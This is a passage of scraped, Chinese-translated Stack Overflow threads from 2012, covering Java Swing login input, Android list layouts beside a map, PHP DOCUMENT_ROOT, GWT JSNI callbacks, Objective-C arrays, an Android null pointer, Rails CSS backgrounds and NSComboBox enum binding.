import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JFrame;
import javax.swing.JTextField;

public class mainMaybe extends JFrame{
    JTextField login;
    JTextField pass;

    public mainMaybe() throws InterruptedException{
        login = new JTextField();
        pass = new JTextField();
        pass.addActionListener(new ActionListener(){
            public void actionPerformed(ActionEvent arg0) {
                 System.out.println("DO SOMETHING");
            }       
        });
        add(login,BorderLayout.NORTH);
        add(pass,BorderLayout.SOUTH);
        pack();
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    public void returnEmail(){
        //SOME HOW WAIT FOR THE ACTION LISTENER?
    }

    public static void main(String[] args) throws InterruptedException {
        new mainMaybe().returnEmail(); 
        //CONTROL SHOULD STAY WITH mainMaybe until an email is returned         
    }

} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-13T03:53:24.200

Java Swing 基于`event-driven architecture`. 因此，事件会触发操作，并且基于这些事件，您将执行某种操作。

[使用 Swing 组件](http://docs.oracle.com/javase/tutorial/uiswing/components/index.html)将是一个很好的起点，可以开始理解并实现您想要在 UI 及其相应行为方面实现的目标。所以我建议你阅读一下它，然后尝试解决你想要实现的目标。

我不太确定您要实现的目标，但如果我是您，我将有两个文本字段，可能会附加一些标签和一个“提交”按钮。我会在`ActionListener`这个按钮上添加一个来执行某种操作。

也许[SSCCE](http://sscce.org/)可以帮助您入门。所以看看这段代码：

```
package com.test;

import javax.swing.JOptionPane;

public class SimpleUI extends javax.swing.JFrame {

    /**
     * Creates new form SimpleUI
     */
    public SimpleUI() {
        initComponents();
    }

    private void initComponents() {

        mainPanel = new javax.swing.JPanel();
        labelName = new javax.swing.JLabel();
        textName = new javax.swing.JTextField();
        jLabel1 = new javax.swing.JLabel();
        textPassword = new javax.swing.JPasswordField();
        jButton1 = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        mainPanel.setBorder(javax.swing.BorderFactory.createEmptyBorder(2, 2, 2, 2));

        labelName.setText("Name: ");

        jLabel1.setText("Password: ");

        jButton1.setText("Submit");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(mainPanel);
        mainPanel.setLayout(mainPanelLayout);
        mainPanelLayout.setHorizontalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainPanelLayout.createSequentialGroup()
                .addGroup(mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(labelName)
                    .addComponent(jLabel1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(textName)
                    .addComponent(textPassword, javax.swing.GroupLayout.DEFAULT_SIZE, 195, Short.MAX_VALUE))
                .addGap(18, 18, 18)
                .addComponent(jButton1)
                .addGap(0, 65, Short.MAX_VALUE))
        );
        mainPanelLayout.setVerticalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(labelName)
                    .addComponent(textName, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(textPassword, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton1))
                .addContainerGap(15, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(mainPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(mainPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );

        pack();
    }

    /**
    *   This is the method that is called when an action is performed.
    *   Over here I just simply show an error message if any of the text fields are empty or just show their names.
    */
    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
        String name         = textName.getText();
        String password     = String.valueOf(textPassword.getPassword());

        if("".equals(password) || "".equals(name)){
            JOptionPane.showMessageDialog(this, "Name or password is empty!", "Incorrect Input", JOptionPane.ERROR_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(this, "Hello "+name+" with password "+password, "Incorrect Input", JOptionPane.PLAIN_MESSAGE);
        }
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {

        try {
            javax.swing.UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(SimpleUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(SimpleUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(SimpleUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(SimpleUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new SimpleUI().setVisible(true);
            }
        });
    }

    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel labelName;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JTextField textName;
    private javax.swing.JPasswordField textPassword;

} 
```

**注意**：我使用 NetBeans IDE 生成了这段代码，所以我不需要处理太多关于布局或任何事情的事情。如果你想了解 Layouts，这里有一个有趣的教程：[“A Visual Guide to Layout Managers”](http://docs.oracle.com/javase/tutorial/uiswing/layout/visual.html)

我的主要想法是向您展示事件是如何触发的。所以我所做的就是`actionlistener`在我的“提交”按钮中添加了一个，当有人点击该按钮时，我会执行某种操作。希望你能得到图片。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T03:52:32.387

我认为您的设计方法错误。在 Java GUI（和大多数类似技术）中，您不会说“等待电子邮件地址”，而是说“当您收到电子邮件地址时告诉我”。

您已经向文本框添加了一个侦听器 - 基本上您想要一个在 texbox 中的值更改时会“触发”的侦听器。侦听器的实现做了一些事情 - 在你的简单示例中，将电子邮件地址写入控制台然后退出。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-13T04:21:29.870

另一种方法，使用模态对话框（或者更确切地说，其中两个）。

```
import javax.swing.*;

public class LoginPrompt {

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                String username = JOptionPane.showInputDialog(null, "User Name");
                System.out.println("Username: " + username);

                JPasswordField passwordField = new JPasswordField(8);
                // a bit quirky, we need to tab to the field
                JOptionPane.showMessageDialog(null, passwordField, "Password",
                        JOptionPane.QUESTION_MESSAGE);
                char[] password = null;
                password = passwordField.getPassword();
                System.out.println("Password: " + String.valueOf(password));
            }
        });
    }
} 
```

# java - 根据地图上的标记动态填充线性布局

> ID：11927967
> 
> 赞同：-1
> 
> 时间：2012-08-13T03:45:57.843
> 
> 标签：java, android, android-layout, android-listview, android-linearlayout

我正在开发一个需要绘制如下 UI 的 android 项目。我需要将android屏幕分成两半。在上半部分，我需要展示谷歌地图。在下半部分，只要有人点击 Google 地图，我就需要显示用户信息。上半部分已经完成，它对我有用。

**问题陈述：-**

我需要根据地图上的数量继续在下半部分`dynamically`创建。下面是我在下半部分创建了两个屏幕截图，考虑到谷歌地图上有。但是我怎样才能让这个东西工作，假设如果我现在有，那么在下半部分，三个布局将自动绘制。我希望我足够清楚。`linear layout``markers(users)``layouts``two user's``dynamically``three user's on the google maps`

![在此处输入图像描述](../Images/5236e16bd9aa46e85a44449bb13708b4.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:37:12.710

是的，您可以使用列表视图并创建自定义适配器。将您的地图设置为列表视图中的标题，并使用您的列表视图行进行数据表示。

您可以做的另一件事是单独创建列表视图和地图。将下方的列表视图与地图对齐

这里我给你一个简单的例子，下面的代码将创建列表视图。您可能需要我为您的目的创建了自定义适配器。

```
public class my_map_activity extends Activity {

    ArrayList<String> name = null;
    ArrayList<String> gender = null;
    ArrayList<String> latitude = null;
    ArrayList<String> longitude = null;
    Context activity_context = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        ListView user_listview = (ListView) findViewById(R.id.user_listview);

        name = new ArrayList<String>();
        gender = new ArrayList<String>();
        latitude = new ArrayList<String>();
        longitude = new ArrayList<String>();

        for (int i = 0; i < 10; i++) {
            name.add ("test user " + i);
            gender.add ("Male");
            latitude.add (""+ i);
            longitude.add (""+ i);
        }

        custom_adapter list_adapter = new custom_adapter (this, android.R.layout.simple_list_item_1, name, gender, latitude, longitude);
        user_listview.setAdapter(list_adapter);
    }
} 
```

这是我的 main.xml 文件。这将告诉您如何创建该布局。我使用相对布局作为我的父布局。

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/RelativeLayout1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="250dp"
        android:layout_alignParentLeft="true"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:src="@drawable/ic_launcher" />

    <ListView
        android:id="@+id/user_listview"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/imageView1" >
    </ListView>

</RelativeLayout> 
```

在这里，我向您发布了我的自定义适配器代码，您可以将其用于您的列表视图目的。

```
public class custom_adapter extends ArrayAdapter<String>{

    ArrayList<String> name = null;
    ArrayList<String> gender = null;
    ArrayList<String> latitude = null;
    ArrayList<String> longitude = null;
    Context activity_context = null;

    public custom_adapter(Context context,
                          int resource,
                          ArrayList<String> name ,
                          ArrayList<String> gender,
                          ArrayList<String> latitude,
                          ArrayList<String> longitude) {
        super(context, resource, name );
        this.name = name;
        this.gender = gender;
        this.latitude = latitude;
        this.longitude = longitude;
        activity_context = context;
    }

    static class ViewHolder
    {
        public TextView txt_name;
        public TextView txt_gender;
        public TextView txt_latitude;
        public TextView txt_longitude;
        public ImageView img_view;
    }

    @Override
    public View getView (final int position,
                         View      convertView,
                         ViewGroup parent)
    {
        View rowView = convertView;
        ViewHolder holder = null;

        if (rowView == null) {
            LayoutInflater inflater = (LayoutInflater)activity_context.getSystemService(
                                               Context.LAYOUT_INFLATER_SERVICE);
            rowView = inflater.inflate(R.layout.row_file, null, false);
            holder = new ViewHolder();
            holder.txt_name = (TextView) rowView.findViewById(R.id.textView1);
            holder.txt_gender = (TextView) rowView.findViewById(R.id.textView2);
            holder.txt_latitude = (TextView) rowView.findViewById(R.id.textView3);
            holder.txt_longitude = (TextView) rowView.findViewById(R.id.textView4);
            holder.img_view = (ImageView) rowView.findViewById(R.id.imageView1);
            rowView.setTag(holder);

        } else {
            holder = (ViewHolder) rowView.getTag();
        }

        if (holder != null) {
            holder.txt_name.setText(name.get(position));
            holder.txt_gender.setText(gender.get(position));
            holder.txt_latitude.setText(latitude.get(position));
            holder.txt_longitude.setText(longitude.get(position));
        }
        return rowView;
    }
} 
```

这是您可以在自定义适配器中扩展并将其设置在列表视图中的布局。

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/RelativeLayout1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:src="@drawable/ic_launcher" android:layout_marginTop="10dp" android:layout_marginLeft="10dp" android:contentDescription="TODO"/>

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:layout_toRightOf="@+id/imageView1"
        android:text="Medium Text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <TextView
        android:id="@+id/textView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_below="@+id/textView1"
        android:layout_toRightOf="@+id/imageView1"
        android:text="Medium Text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <TextView
        android:id="@+id/textView3"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignLeft="@+id/textView2"
        android:layout_alignParentRight="true"
        android:layout_below="@+id/textView2"
        android:text="Medium Text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <TextView
        android:id="@+id/textView4"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignLeft="@+id/textView3"
        android:layout_alignParentRight="true"
        android:layout_below="@+id/textView3"
        android:text="Medium Text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

</RelativeLayout> 
```

所以我给了你所有的四个文件。在这里，我正在解释每个文件将做什么。

1.  my_map_activity ：这是包含listivew 和map 的主要活动。我正在使用一个大的图像视图。您可以放置​​地图，而不是该图像视图。

2.  main.xml ：这是包含列表视图和地图的布局文件。

3.  custom_adapter ：这是我为您创建的自定义适配器。我正在扩展阵列适配器。在此，我从arraylist 中获取数据并膨胀行布局，并且我正在设置相应的值。

4.  row_layout ：这是包含用户、姓名、性别和所有其他内容的图像视图的行布局。

因此，如果您需要任何帮助，我已经为您创建了几件事，然后您可以询问并尝试了解每个文件的概念我是如何使用的。

# php - 文档根 PHP

> ID：11927968
> 
> 赞同：31
> 
> 时间：2012-08-13T03:45:57.893
> 
> 标签：php, html, root

只是为了确认，正在使用：

```
$_SERVER["DOCUMENT_ROOT"] 
```

与使用相同：/

在 HTML 中。

例如。如果当前文档是：

```
folder/folder/folder/index.php 
```

我可以使用（在 HTML 中）从根开始：

```
/somedoc.html 
```

并在 PHP 中做同样的事情，我必须使用：

```
$_SERVER["DOCUMENT_ROOT"] . "/somedoc.html"; 
```

那是对的吗？有更简单的方法吗？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-08-13T04:00:49.187

```
<a href="<?php echo $_SERVER['DOCUMENT_ROOT'].'/hello.html'; ?>">go with php</a>
    <br />
<a href="/hello.html">go to with html</a> 
```

自己尝试一下，发现它们并不完全相同。

`$_SERVER['DOCUMENT_ROOT']`呈现一个实际的文件路径（在我的计算机上作为它自己的服务器运行，`C:/wamp/www/`

在我的例子中， HTML`/`呈现服务器 url 的根，`localhost/`

但实际上是同一个`C:/wamp/www/hello.html`文件`localhost/hello.html`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-13T04:01:52.760

只是`/`指公共 html 文件夹中您网站的根目录。`DOCUMENT_ROOT`指的是服务器上包含您的网站的文件夹的本地路径。

例如，我在一台机器上安装了 EasyPHP...

`$_SERVER["DOCUMENT_ROOT"]`给了我`file:///C:/Program%20Files%20(x86)/EasyPHP-5.3.9/www`，但我链接到的任何文件`/`都将与我的`www`文件夹相关。

如果您想提供服务器上文件的绝对路径（从服务器的根目录），您可以使用`DOCUMENT_ROOT`. 如果您想从网站的根目录中提供文件的绝对路径，请使用`/`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-11-11T07:33:04.603

**是**的，`$_SERVER['DOCUMENT_ROOT']`包含与*客户端 URL 路径*相关的*服务器端*路径。但是，**不**，它们不可互换。 *`/`*

 ***它们不可互换，因为例如，服务器端路径永远不应发送到客户端 (HTML) 端。的值`$_SERVER['DOCUMENT_ROOT']`不是`/`；它是服务器向客户端显示的服务器的本地*文件路径*`/`。因此， 的值`${$_SERVER['DOCUMENT_ROOT']}/images/thumbnail.png"`可能是`/var/www/html/images/thumbnail.png`服务器上的字符串，可以从客户端的 url 访问该路径的本地文件`http://example.com/images/thumbnail.png`

注意：`$_SERVER['DOCUMENT_ROOT']`不包括尾随`/`

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2012-08-13T04:09:32.067

最简单的方法是拥有良好的站点结构并将其写为常量。

```
DEFINE("BACK_ROOT","/var/www/"); 
```***

# gwt - 如何在 JSNI 中将值从 JS 代码传递到 Java

> ID：11927972
> 
> 赞同：1
> 
> 时间：2012-08-13T03:46:57.923
> 
> 标签：gwt, jsni

我想将加速度的值从 js 传递给 java。谁能告诉我哪里错了？

这是我的代码：

```
public class Accelerometer extends JavaScriptObject {

protected Accelerometer(){};

public static native double getCurrentAccelerationX() /*-{
    var x = 0.0;
    $wnd.ondevicemotion = function(event){
    //$wnd.alert(event.accelerationIncludingGravity.x);
    x = event.accelerationIncludingGravity.y; 
    };
    return x;
}-*/; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T14:28:08.537

好的，所以你所拥有的将不起作用，因为你的函数会立即返回，但实际值要等到以后才能使用。

你需要让你的 JSNI 函数在你的类改变时调用它。

（另外：如果您发布的是您的 Accelerometer 类的范围，则无需将其扩展`JavaScriptObject`。）

尝试这样的事情：

```
package foo.bar;

public class Accelerometer {
    public void currentAcceleration(double x, double y) {
        Window.alert("currentAcceleration: " + x + ", " + y);
    }

    public static native void getCurrentAcceleration(Accelerometer p) /*-{
        $wnd.ondevicemotion = function(event) {
            var acc = event.accelerationIncludingGravity;
            $entry( p.@foo.bar.Accelerometer::currentAcceleration(DD)(acc.x, acc.y) );
        };
    }-*/;
} 
```

您可以将此方法作为 Accelerometer 的成员而不是静态方法，但我更喜欢将实例作为参数传递给函数以避免与`this`.

# iphone - 如何从 NSMutableArray 访问 NSObject 类变量进行排序

> ID：11927975
> 
> 赞同：0
> 
> 时间：2012-08-13T03:47:26.043
> 
> 标签：iphone, objective-c, ios, nsmutablearray, nsobject

我已经添加了几个`class Objects`到`NSMutableArray`. 它似乎有效，但是我现在想访问存储在数组中的类对象内部的变量，但是我现在遇到了一些错误。

最初，我有一个`NSDictionary`条目，它们都`NSString`基于我传递 /s 的方法的目的，即`NSArray`获取`NSDictionary`字典中的每个条目并将其放入正确类型的变量中。然后这个`NSObject`变量被传递回它被调用的地方。

下面是我用来实现这一点的代码。

**响应.m**

```
 // initalise NSOject Class
  SearchResultList *searchResultList = [[SearchResultList alloc]init];

 // Create mutableArray with compacity (compacity is based of the current array of NSDictionarys (entries are strings))
   NSMutableArray *searchObjectArray = [[NSMutableArray alloc] initWithCapacity:[filteredArray count]];

  // count to track progress of the array
   int myCount = 0;

  // for loop goes through the array passing each object in the array over to the search class object
   for (id obj in filteredArray) {

        // Pass current array object over to the NSObject Class Method, this method assigns the entires of the NSDictionary object to the variables of the object class coorect type values
          [searchResultList assignSearchData:filteredArray[myCount]];

         // This is where I capture the returning NSObject Class (at least I think thats whats happening.
           [searchObjectArray addObject:searchResultList];

         // increments count
            myCount ++;

    }

//.. 
```

这是在 for 循环中调用的类方法

**搜索结果列表.m**

```
//return is of type, SearchResultList which is the object class itself... not sure if this is 100% correct.
- (SearchResultList *)assignSeriesSearchData:(NSMutableDictionary*)tempDict
{

//add all of the NSDictionary entries into their own variables of the correct type such as

// initalize DOORID - NSInteger
    doorID = [[tempDict valueForKey:@"DOORID"] integerValue];

// initalize DOORDESC - NSString
    doorDesc = [tempDict valueForKey:@"DOORDESC"];

// initalize DOOROPEN - BOOL
    doorOpen = [[tempDict valueForKey:@"DOOROPEN"] boolValue];

 // initalize DOORLETTER - char
    doorLetter = [[tempDict valueForKey:@"DOORLETTER"] UTF8String];

//...

//then I return the NSObject Class to the place where it was called

return self;
} 
```

所以从这里开始，我最终回到了**response.m**的 for 循环中，我在其中调用`searchObjectArray addObject:searchResultList];`以捕获返回的类对象。

此时我有**两个问题**。

*首先*，我`NSObject`是否正确捕获了类

*其次*，一旦我将所有类对象添加到数组中，我如何才能访问数组中特定对象的变量？

我问第二个问题的原因是因为我想将此数组传递给排序方法，该方法根据数组中对象的一个​​或多个变量进行排序。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T05:03:52.750

对于您的第一个问题：您应该在循环中分配/初始化您的`SearchResultList`类的一个新实例，否则您将只是重用和覆盖同一个对象。在您的问题中，您一直将 is 称为`NSObject`，从技术上讲，它是 的子类`NSObject`，但它实际上是您的自定义类的一个实例。（作为旁注，我建议使用类名，`SearchResultItem`而不是 SearchResultList，因为它不是真正的列表，这可能会让查看您的代码的人感到困惑，但我已经按照您的方式保留了它。）

```
NSMutableArray *searchObjectArray = [[NSMutableArray alloc] initWithCapacity:[filteredArray count]];

for (NSDictionary *obj in filteredArray) {
    SearchResultList *searchResultList = [[SearchResultList alloc] init];
    [searchResultList assignSearchData:obj];
    [searchObjectArray addObject:searchResultList];
} 
```

另请注意，由于您对循环使用快速迭代，因此不需要 myCount 计数器，因为快速迭代会拉出数组中的下一个对象，供您在循环的每次迭代中使用。

对于您的第二个问题，您需要首先将数组中的对象转换为您的自定义类（SearchResultList），以便访问特定属性。例如：

```
SearchResultList* myObj = (SearchResultList*)[searchObjectArray objectAtIndex:0];
int doorID = myObj.doorID; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:52:25.803

您可以通过调用以下代码行来访问 NSObject 属性：

```
NSLog(@"%@", myobj.doorID); 
```

# java - onClick() 上的空指针

> ID：11927976
> 
> 赞同：-2
> 
> 时间：2012-08-13T03:47:46.117
> 
> 标签：java, android, onclick, nullpointerexception

我有一个 android 应用程序，一些用户在下面代码的 onClick 方法上报告了一个空指针。日志显示第 226 行，这就是 selectedAlbum.getId() 检查空值的地方。我没有遇到此错误，但市场报告在 2 台设备上显示此错误。我能做些什么来解决这个问题？

```
public void onClick(View v) {
                Log.v("uploadButton", "uploadButton Clicked");

                if ((selectedAlbum.getId() == null)
                        || (selectedAlbum.getId() == "")) {
                    Toast.makeText(getApplicationContext(),
                            "Please Select an Album First", Toast.LENGTH_LONG)
                            .show();

                } else {

                    if (m_photos.isEmpty()) {
                        Toast.makeText(getApplicationContext(),
                                "No Pictures Selected", Toast.LENGTH_LONG)
                                .show();
                    } else {

                        // Do action to upload photos from array to facebook
                        progressDialog = ProgressDialog
                                .show(EasyPhotoUpload.this, "",
                                        "Uploading Photos...");
                        Log.v("uploadButton", "Starting upload thread");
                        new Thread(new Runnable() {

                            @Override
                            public void run() {
                                Log.v("uploadButton", "running....."); 
```

这是设置 selectedAlbum 的代码。

```
public class AlbumSelectedListener implements OnItemSelectedListener {
        @Override
        public void onItemSelected(AdapterView<?> parent, View view, int pos,
                long id) {
            selectedAlbum = (Album) albumSpinner.getItemAtPosition(pos);
        }

        @Override
        public void onNothingSelected(AdapterView<?> parent) {/* not implemented */
        }
    } 
```

selectedAlbum 也在活动开始和 onCreate 之前设置。

```
public Album selectedAlbum; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:57:01.607

要阻止应用程序崩溃，只需检查`if(selectedAlbum == null)`. 如果是，请优雅地处理这种情况并避免用户遇到强制关闭。

可能会显示一个 Toast 或对话框，要求用户“请选择专辑”。如果不了解如何`selectAlbum`分配值，就不可能知道为什么只有两部手机创建了此错误报告。这些用户可能点击了一系列您没有预料到的按钮，或者这可能是制造商的怪癖……没有更多信息是不可能知道的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T17:06:37.810

事实证明，由于用户端的错误，应用程序无法从 Facebook 检索专辑列表，几乎没有错误。现在这个问题已经解决了。感谢那些回复的人。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T03:53:14.520

我认为您提供了错误的代码段。如果 NPE 在

```
if ((selectedAlbum.getId() == null) 
```

...然后`selectedAlbum`是空的，你不能打电话`null.getId()`

# css - rails css设置背景图片

> ID：11927978
> 
> 赞同：1
> 
> 时间：2012-08-13T03:47:53.347
> 
> 标签：css, ruby-on-rails-3.2

# main.css

```
body{
    width:100%;
    height:100%;
    overflow:hidden;
    background:url('/assets/background-calculations.png');
}
body #content{
    z-index:5;
    background:url('/assets/handwritten-text.png');
//  background:white;
    width:100%;
    height:100px;
}
body #footer,#header{
    height:100px;
    width:100%;
    margin:0 auto;
} 
```

# index.html.erb 为空白

# 怀疑

当我`background:white;`在内容 css 中取消注释它的工作但是当我设置背景 url 它不工作时，但是如果我为内容 div 设置它，相同的 url 不起作用，请帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T07:19:49.763

如果您在 ruby​​-on-rails 中工作，则您拥有资产 > 图像。把图片放在那里。

在您的样式表文件夹（资产>样式表）中，您必须指向图像，而不是文件夹和图像：

```
body{
    width:100%;
    height:100%;
    overflow:hidden;
    background:url(background-calculations.png);
}
body #content{
    z-index:5;
    background:url(handwritten-text.png);
    width:100%;
    height:100px;
} 
```

Ruby-on-rails 知道您的图像在哪里

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T07:01:08.603

尝试类似的东西；

```
body #content{
    z-index:5;
    background-image:url('/assets/handwritten-text.png');
    background-color:white;
    width:100%;
    height:100px;
} 
```

***[这](http://jsfiddle.net/blasteralfred/BR9RD/)***是一个工作现场演示。

# cocoa - 将 NSComboBox 绑定到枚举？

> ID：11927991
> 
> 赞同：3
> 
> 时间：2012-08-13T03:50:29.210
> 
> 标签：cocoa, enums, cocoa-bindings, nscombobox

我有一个非常简单的问题，但解决方案证明非常难以捉摸。

这是我所拥有的：

```
typedef { foo, bar, baz} EnumType;

@interface SomeObject: NSObject
@property EnumType someEnumValue;
@end 
```

...以及带有 object_controller 和 NSComboBox 的视图，该视图应显示 [object_controller selection] 实例的 someEnumValue 的字符串名称。

我意识到我不能直接将枚举值的名称作为字符串访问。我已经尝试创建一个 NSArray 保存枚举值的名称，并将 ContentValues 属性绑定到它 - 这会加载带有属性字符串的组合框，但我找不到任何方法来关联所选实例中的枚举值组合框中的值。

我还尝试使用 NSValueTransformer 将枚举值转换为 NSStrings，反之亦然，但对于我的生活，我无法让它工作：大多数这些尝试都会导致抛出异常。

这个微不足道的任务已经消耗了我大约三个小时的生命。帮助！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T08:30:38.460

我可以想到两种方法来解决您的问题。

1.  以与枚举中相同的顺序加载带有字符串的数组。由于您已经完成了查询 NSComboBox 以获取“indexOfSelectedItem”的其余内容，将为您提供枚举的确切值。（注意：仅当您的枚举从零开始时才有效。我想在查看您的示例时就是这种情况。）

2.  由于您创建了一个类来保存枚举值。向其中添加一个属性，该属性将保存枚举的名称。再次查询 NSComboBox 中的 indexOfSelectedItem。您现在可以通过从用于绑定的 arrayController 的排列对象访问给定索引处的对象轻松获取关联的值组合框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T15:55:40.917

记录我为后代选择的解决方案：

最后，我通过......不使用枚举解决了这个问题。

当然，问题在于组合框希望绑定到对象数组（即 NSObject 的实例），但枚举被定义为常量整数（它们是原语）。

我确信可以提供一些基础设施来将枚举值转换为对象，然后再转换回来。（从表面上看，这就是 NSValueTransformer 类所做的事情，并且很容易继承和设计一个......但是对于我的生活，我找不到任何将我的 NSValueTransformer 子类或其实例实际绑定到组合的方法盒子。那个基本步骤的文档不存在。这太疯狂了——我发现的每个例子都只是谈论如何子类化它，而不是如何绑定它。我尝试的一切都抛出了异常。）

最后，我意识到，只需将枚举值变成类的实例，就可以避免所有这些艰苦的工作和翻译。

因此，对于枚举，您必须执行所有这些操作：

```
typedef { a, b, c } EnumType;
@interface SomeClass {
    @property EnumType enumValue;
}...

// somewhere else, something like this:
NSMutableArray *enumTypeNames = { @"a", @"b", @"c" }; 
```

...然后将组合框绑定到 enumTypeNames，并执行一些技巧将枚举值转换为 enumTypeNames 索引，反之亦然。

或者，您可以这样做：

```
@interface EnumClass {
    @property NSString *name;
} ...
@interface SomeClass {
    @property (weak) EnumClass *enumValue;
} ...

// somewhere else:
NSMutableArray *enumValues = [NSMutableArray new];
[enumValues addObject: [EnumClass initWithName: @"a"]];
[enumValues addObject: [EnumClass initWithName: @"b"]];
[enumValues addObject: [EnumClass initWithName: @"c"]]; 
```

...并将组合框直接绑定到数组（名称指定为模型键路径）。更清洁的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-17T05:45:53.857

我认为您可以使用`NSValueTransformer`.

尝试像这样定义您的枚举：

```
typedef NS_ENUM(NSUInteger, EnumType) {
    foo = 0,
    bar = 1,
    baz = 2
}; 
```

然后在您的价值转换器中，将输入视为 an`NSNumber`和 call `-unsignedIntegerValue`。如果需要，将其转换为您的枚举类型，通过 switch 语句运行它，然后返回正确的字符串。

绑定应该自动将枚举值包装为 NSNumber。

# google-analytics - 谷歌分析跟踪代码“未安装”，即使它是

> ID：11927994
